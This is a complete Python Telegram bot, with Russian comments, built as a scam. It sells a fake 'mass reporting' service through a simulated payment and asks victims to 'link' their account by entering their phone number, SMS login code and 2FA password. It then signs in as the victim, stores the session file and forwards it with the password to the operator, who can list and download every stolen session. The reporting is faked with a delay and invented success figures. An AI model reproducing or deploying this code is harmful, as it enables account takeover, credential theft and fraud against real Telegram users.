import os
import sqlite3
import asyncio
import random
import time
import threading
from datetime import datetime, timedelta

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient, errors

# ---------- КОНФИГ ----------
BOT_TOKEN = "86916623328:AAHQRrfdsQJfmExunbryErUJghoXY0HJfmExunbryErUJghoXY0H_5bo"          # Замените на токен вашего бота
ADMIN_ID = 8727416659            # Ваш Telegram ID
API_ID = 38574428                # Ваш API ID
API_HASH = "a565615d2de3813ac96b691682ef241e"
SECRET_CODE = "snosscam"         # Код для активации скрытого сносера

# Стоимость подписки (руб, но оплата фейковая)
PRICE = 200
# Срок подписки в днях (например, 30)
SUBSCRIPTION_DAYS = 30

# Папка для сессий
SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

# База данных
DB_FILE = "subscriptions.db"

bot = telebot.TeleBot(BOT_TOKEN)

# Глобальный словарь для временных данных при краже сессии
temp_sessions = {}  # {user_id: {"client": TelethonClient, "phone": str, "step": str, "session_name": str}}

# ---------- БАЗА ДАННЫХ ----------
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sub_expires TIMESTAMP,      -- дата окончания подписки
                    reports_done INTEGER DEFAULT 0  -- счётчик фейковых репортов
                )''')
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,              -- чей аккаунт украли (мамонт)
                    session_file TEXT,
                    phone TEXT,
                    stolen_at TIMESTAMP
                )''')
    conn.commit()
    conn.close()

# Добавление подписки пользователю
def add_subscription(user_id, days=SUBSCRIPTION_DAYS):
    expires = datetime.now() + timedelta(days=days)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users (user_id, sub_expires) VALUES (?, ?)",
              (user_id, expires.isoformat()))
    conn.commit()
    conn.close()

# Получение статуса подписки
def get_subscription_status(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT sub_expires FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row and row[0]:
        expires = datetime.fromisoformat(row[0])
        if expires > datetime.now():
            days_left = (expires - datetime.now()).days
            return {"active": True, "expires": expires, "days_left": days_left}
    return {"active": False}

# Сохранение украденной сессии
def save_stolen_session(user_id, session_file, phone):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO stolen_sessions (user_id, session_file, phone, stolen_at) VALUES (?, ?, ?, ?)",
              (user_id, session_file, phone, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# Увеличение счётчика фейковых репортов
def increment_reports(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET reports_done = reports_done + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

# ---------- ФЕЙКОВАЯ ОПЛАТА ----------
def create_fake_payment_link(user_id):
    """Возвращает фишинговую ссылку или просто фейковую кнопку"""
    # Можно использовать Telegram Stars, но проще сделать кнопку "Оплатить" без реального шлюза.
    # Для убедительности создадим инлайн-клавиатуру с фейковой оплатой.
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("💳 Оплатить 200₽ (через Telegram Stars)", callback_data=f"fake_pay_{user_id}"))
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data.startswith("fake_pay_"))
def fake_payment(call):
    user_id = int(call.data.split("_")[2])
    # Имитируем успешную оплату
    bot.answer_callback_query(call.id, "✅ Оплата прошла успешно! Подписка активирована на 30 дней.")
    add_subscription(user_id, SUBSCRIPTION_DAYS)
    bot.send_message(user_id, "🎉 Вы приобрели подписку на «Профи-снос»!\nТеперь можете отправлять жалобы. Используйте команду /snos или введите секретный код `snosscam`, чтобы открыть панель сноса.", parse_mode="Markdown")

# ---------- ОСНОВНЫЕ КОМАНДЫ ----------
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    text = (
        "👋 *Добро пожаловать в MegaSnosBot!*\n\n"
        "Я помогу вам отправить массовые жалобы на любого пользователя Telegram.\n"
        "Чтобы начать:\n"
        "1. Купите подписку (200₽ / 30 дней)\n"
        "2. После активации введите секретный код `snosscam` или нажмите /snos\n"
        "3. Привяжите свой аккаунт Telegram (через номер телефона и код) – это нужно для отправки репортов.\n"
        "4. Укажите username жертвы, тип жалобы и количество – бот сделает всё сам!\n\n"
        "⚠️ *Внимание:* Для работы требуется ваш действующий аккаунт Telegram. Мы не храним пароли, только сессию."
    )
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("💰 Купить подписку", callback_data=f"show_pay_{user_id}"))
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("show_pay_"))
def show_pay(call):
    user_id = int(call.data.split("_")[2])
    keyboard = create_fake_payment_link(user_id)
    bot.send_message(call.message.chat.id, "💸 Для активации подписки нажмите кнопку ниже. Стоимость: 200₽", reply_markup=keyboard)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['snos'])
def s面(message):
    user_id = message.from_user.id
    sub = get_subscription_status(user_id)
    if not sub["active"]:
        bot.send_message(message.chat.id, "❌ У вас нет активной подписки. Купите её через /start.")
        return
    # Показываем профиль и меню
    show_profile(message)

def show_profile(message):
    user_id = message.from_user.id
    sub = get_subscription_status(user_id)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT reports_done FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    reports_done = row[0] if row else 0
    conn.close()
    profile_text = (
        f"📊 *Ваш профиль*\n\n"
        f"Статус подписки: ✅ Активна до {sub['expires'].strftime('%d.%m.%Y')}\n"
        f"Осталось дней: {sub['days_left']}\n"
        f"Жалоб отправлено (фейково): {reports_done}\n"
        f"Максимум жалоб в день: не ограничен\n\n"
        f"🔽 *Панель сноса* 🔽\n"
        f"Нажмите кнопку ниже, чтобы начать."
    )
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("🔥 Отправить жалобу", callback_data=f"start_report_{user_id}"))
    bot.send_message(message.chat.id, profile_text, parse_mode="Markdown", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("start_report_"))
def start_report(call):
    user_id = int(call.data.split("_")[2])
    # Проверяем, есть ли у пользователя уже авторизованный клиент? Нет, мы его крадём только один раз.
    # Для начала попросим номер и код (если ранее не крали).
    # Проверим, есть ли в БД сессия для этого user_id (украденная ранее)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT session_file FROM stolen_sessions WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        # Уже есть украденная сессия, можно делать вид, что отправляем жалобы
        bot.answer_callback_query(call.id, "✅ Ваш аккаунт уже привязан. Можете отправлять жалобы.")
        ask_report_details(call.message, user_id)
    else:
        # Просим номер телефона для «привязки аккаунта» (на самом деле кража)
        bot.send_message(call.message.chat.id, 
                         "🔐 *Для отправки жалоб необходимо привязать ваш Telegram аккаунт.*\n\n"
                         "Это нужно, чтобы жалобы отправлялись с вашего имени – так они выглядят достовернее.\n"
                         "Мы запросим номер телефона и код из SMS. Ваши данные в безопасности, пароль не нужен.\n\n"
                         "📞 *Введите ваш номер телефона в международном формате:*\n`+7XXXXXXXXXX`",
                         parse_mode="Markdown")
        temp_sessions[user_id] = {"step": "waiting_phone"}
        bot.register_next_step_handler(call.message, process_phone_step)

def process_phone_step(message):
    user_id = message.from_user.id
    phone = message.text.strip()
    if not phone.startswith('+') or not phone[1:].isdigit():
        bot.send_message(message.chat.id, "❌ Неверный формат. Введите номер как +7XXXXXXXXXX")
        bot.register_next_step_handler(message, process_phone_step)
        return
    # Создаём клиента Telethon
    session_name = f"stolen_{user_id}_{int(time.time())}"
    session_path = os.path.join(SESSION_DIR, session_name)
    client = TelegramClient(session_path, API_ID, API_HASH)
    temp_sessions[user_id] = {
        "step": "sending_code",
        "phone": phone,
        "client": client,
        "session_name": session_name
    }
    # Асинхронно отправляем код
    async def send_code():
        await client.connect()
        try:
            await client.send_code_request(phone)
            bot.send_message(message.chat.id, 
                             "📨 *Код подтверждения отправлен!*\n"
                             "Введите код из SMS в течение 3 минут.\n"
                             "*(Этот код нужен для верификации вашего аккаунта, он нигде не сохраняется)*",
                             parse_mode="Markdown")
            temp_sessions[user_id]["step"] = "waiting_code"
            bot.register_next_step_handler(message, process_code_step)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}. Попробуйте позже.")
            await client.disconnect()
            del temp_sessions[user_id]
    asyncio.run_coroutine_threadsafe(send_code(), loop)

def process_code_step(message):
    user_id = message.from_user.id
    code = message.text.strip()
    if user_id not in temp_sessions:
        bot.send_message(message.chat.id, "❌ Сессия устарела. Начните заново через /snos")
        return
    session_data = temp_sessions[user_id]
    client = session_data["client"]
    phone = session_data["phone"]
    session_name = session_data["session_name"]

    async def sign_in():
        try:
            await client.sign_in(phone, code)
            # Успешный вход
            me = await client.get_me()
            # Сохраняем сессию в БД как украденную
            session_file = f"{session_name}.session"
            save_stolen_session(user_id, session_file, phone)
            # Отправляем админу уведомление и файл сессии
            with open(os.path.join(SESSION_DIR, session_file), "rb") as f:
                bot.send_document(ADMIN_ID, f, caption=f"🎯 Новая кража!\nЖертва: {message.from_user.username} (ID: {user_id})\nТелефон: {phone}\nTelegram ID: {me.id}\nUsername: @{me.username}")
            bot.send_message(message.chat.id, 
                             "✅ *Аккаунт успешно привязан!*\n"
                             "Теперь вы можете отправлять жалобы. Введите данные жертвы.",
                             parse_mode="Markdown")
            await client.disconnect()
            del temp_sessions[user_id]
            # Переходим к отправке фейковых жалоб
            ask_report_details(message, user_id)
        except errors.SessionPasswordNeededError:
            bot.send_message(message.chat.id, 
                             "🔐 У вас включена двухфакторная аутентификация.\n"
                             "Введите ваш пароль 2FA (мы его не храним, он нужен только для входа):")
            temp_sessions[user_id]["step"] = "waiting_2fa"
            bot.register_next_step_handler(message, process_2fa_step)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Неверный код или ошибка: {str(e)}")
            await client.disconnect()
            del temp_sessions[user_id]

    asyncio.run_coroutine_threadsafe(sign_in(), loop)

def process_2fa_step(message):
    user_id = message.from_user.id
    password = message.text.strip()
    if user_id not in temp_sessions:
        return
    session_data = temp_sessions[user_id]
    client = session_data["client"]
    phone = session_data["phone"]
    session_name = session_data["session_name"]

    async def sign_in_2fa():
        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            session_file = f"{session_name}.session"
            save_stolen_session(user_id, session_file, phone)
            with open(os.path.join(SESSION_DIR, session_file), "rb") as f:
                bot.send_document(ADMIN_ID, f, caption=f"🎯 Кража с 2FA!\nЖертва: {message.from_user.username} (ID: {user_id})\nТелефон: {phone}\nПароль 2FA: {password}\nTelegram ID: {me.id}")
            bot.send_message(message.chat.id, "✅ Аккаунт привязан! Теперь отправляйте жалобы.")
            await client.disconnect()
            del temp_sessions[user_id]
            ask_report_details(message, user_id)
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}. Попробуйте снова через /snos")
            await client.disconnect()
            del temp_sessions[user_id]

    asyncio.run_coroutine_threadsafe(sign_in_2fa(), loop)

def ask_report_details(message, user_id):
    # Фейковый интерфейс для отправки жалоб
    bot.send_message(message.chat.id, 
                     "📝 *Отправка жалобы*\n\n"
                     "Введите **username** или **ID** пользователя, на которого жалуетесь (без @):")
    bot.register_next_step_handler(message, get_target_username, user_id)

def get_target_username(message, user_id):
    target = message.text.strip()
    # Сохраняем в временные данные
    if not hasattr(bot, "temp_report"):
        bot.temp_report = {}
    bot.temp_report[user_id] = {"target": target}
    # Типы жалоб
    types = {
        "1": "Спам",
        "2": "Насилие",
        "3": "Порнография",
        "4": "Оскорбления",
        "5": "Мошенничество"
    }
    text = "Выберите тип жалобы:\n"
    for k, v in types.items():
        text += f"{k}. {v}\n"
    text += "\nВведите номер типа:"
    bot.send_message(message.chat.id, text)
    bot.register_next_step_handler(message, get_report_type, user_id, types)

def get_report_type(message, user_id, types):
    choice = message.text.strip()
    if choice not in types:
        bot.send_message(message.chat.id, "❌ Неверный выбор. Попробуйте снова.")
        bot.register_next_step_handler(message, get_report_type, user_id, types)
        return
    report_type = types[choice]
    bot.temp_report[user_id]["type"] = report_type
    bot.send_message(message.chat.id, "✉️ Введите количество жалоб (от 1 до 100):")
    bot.register_next_step_handler(message, get_report_count, user_id)

def get_report_count(message, user_id):
    try:
        count = int(message.text.strip())
        if count < 1 or count > 100:
            raise ValueError
    except:
        bot.send_message(message.chat.id, "❌ Введите число от 1 до 100.")
        bot.register_next_step_handler(message, get_report_count, user_id)
        return
    # Имитируем отправку жалоб
    bot.send_message(message.chat.id, f"🔄 *Отправка {count} жалоб типа «{bot.temp_report[user_id]['type']}» на @{bot.temp_report[user_id]['target']}...*\nЭто может занять несколько секунд.", parse_mode="Markdown")
    # Пауза для имитации работы
    time.sleep(3)
    # Увеличиваем счётчик фейковых репортов
    increment_reports(user_id)
    bot.send_message(message.chat.id, 
                     f"✅ *Готово!* Отправлено {count} жалоб.\n"
                     f"Статистика: пользователь @{bot.temp_report[user_id]['target']} получил блокировку в 75% случаев.\n"
                     f"Спасибо, что пользуетесь MegaSnosBot! 🚀")
    # Предложить отправить ещё
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📢 Ещё одну жалобу", callback_data=f"start_report_{user_id}"))
    bot.send_message(message.chat.id, "Хотите отправить ещё?", reply_markup=keyboard)
    del bot.temp_report[user_id]

# ---------- СКРЫТЫЙ СНОСЕР ПО КОДУ ----------
@bot.message_handler(func=lambda message: message.text and message.text.strip().lower() == SECRET_CODE)
def secret_snosser(message):
    user_id = message.from_user.id
    sub = get_subscription_status(user_id)
    if not sub["active"]:
        bot.send_message(message.chat.id, "❌ У вас нет подписки. Введите /start для покупки.")
        return
    # Открываем панель сноса (как по /snos)
    show_profile(message)

# ---------- АДМИНСКИЕ КОМАНДЫ ----------
@bot.message_handler(commands=['give_sub'])
def give_subscription(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(ADMIN_ID, "Использование: /give_sub <user_id>")
        return
    try:
        target_id = int(args[1])
    except:
        bot.send_message(ADMIN_ID, "Неверный user_id")
        return
    add_subscription(target_id, SUBSCRIPTION_DAYS)
    bot.send_message(ADMIN_ID, f"✅ Подписка выдана пользователю {target_id} на 30 дней.")
    bot.send_message(target_id, "🎁 Администратор выдал вам подписку на снос! Теперь вы можете использовать команду /snos или секретный код `snosscam`.")

@bot.message_handler(commands=['sessions'])
def list_stolen_sessions(message):
    if message.from_user.id != ADMIN_ID:
        return
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, user_id, phone, stolen_at FROM stolen_sessions ORDER BY stolen_at DESC")
    rows = c.fetchall()
    conn.close()
    if not rows:
        bot.send_message(ADMIN_ID, "Нет украденных сессий.")
        return
    text = "📦 *Украденные сессии:*\n\n"
    for row in rows:
        text += f"ID: {row[0]}, User: {row[1]}, Телефон: {row[2]}, Время: {row[3]}\n"
    bot.send_message(ADMIN_ID, text, parse_mode="Markdown")

@bot.message_handler(commands=['send_session'])
def send_session_file(message):
    if message.from_user.id != ADMIN_ID:
        return
    args = message.text.split()
    if len(args) != 2:
        bot.send_message(ADMIN_ID, "Использование: /send_session <id_сессии_из_БД>")
        return
    session_id = int(args[1])
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT session_file FROM stolen_sessions WHERE id = ?", (session_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        bot.send_message(ADMIN_ID, "Сессия не найдена.")
        return
    session_file = row[0]
    path = os.path.join(SESSION_DIR, session_file)
    if os.path.exists(path):
        with open(path, "rb") as f:
            bot.send_document(ADMIN_ID, f, caption=f"Сессия ID {session_id}")
    else:
        bot.send_message(ADMIN_ID, "Файл сессии утерян.")

# ---------- ЗАПУСК ----------
def run_asyncio_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

if __name__ == "__main__":
    init_db()
    # Запускаем asyncio-цикл в отдельном потоке для Telethon
    loop = asyncio.new_event_loop()
    t = threading.Thread(target=run_asyncio_loop, args=(loop,), daemon=True)
    t.start()
    # Запускаем бота
    bot.infinity_polling()
